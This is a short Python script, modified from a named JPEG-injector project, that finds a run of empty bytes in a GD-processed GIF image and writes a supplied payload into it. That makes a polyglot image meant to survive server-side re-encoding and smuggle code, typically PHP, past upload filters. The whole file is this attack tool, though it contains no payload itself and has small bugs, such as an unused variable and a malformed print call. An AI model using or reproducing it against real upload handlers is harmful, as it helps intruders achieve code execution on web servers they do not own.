#!/usr/bin/python

#modified from https://github.com/dlegs/php-jpeg-injector/blob/master/gd-jpeg.py

import sys
import binascii

def main():

    if len(sys.argv) != 4:
        print("USAGE: <gd-gif> <payload> <output_name>")
        sys.exit()

    gif = sys.argv[1]
    payload = sys.argv[2]
    output = sys.argv[3]
    payload_len = len(payload)

    loc = get_loc(gif, payload_len)
    inject_payload(gif, loc, payload, output)

def get_loc(gif,payload_len):

    empty_space = payload_len*'00'
    print("Searching for %s bytes empty space") % (payload_len)
    f = open(gif, 'rb')
    contents = f.read()
    loc = contents.find(binascii.unhexlify(empty_space))
    f.close()

    if loc != -1:
        print("Found empty space.")
        return loc
    else:
        print("Can't found enough empty space, try other .gif image. Exiting.")
        sys.exit()

def inject_payload(gif, loc, payload, output):

    bin_payload = bin(int(binascii.hexlify(payload),16))

    f = open(gif, 'rb')
    fo = open(output, 'wb')

    print("Injecting payload...")
    contents = f.read()
    pre_payload = contents[:loc]
    post_payload = contents[loc + len(payload):]
    fo.write(pre_payload + payload + post_payload + '\n')
    print("Payload written.")

    f.close()
    fo.close()

if __name__ == "__main__":
    main()
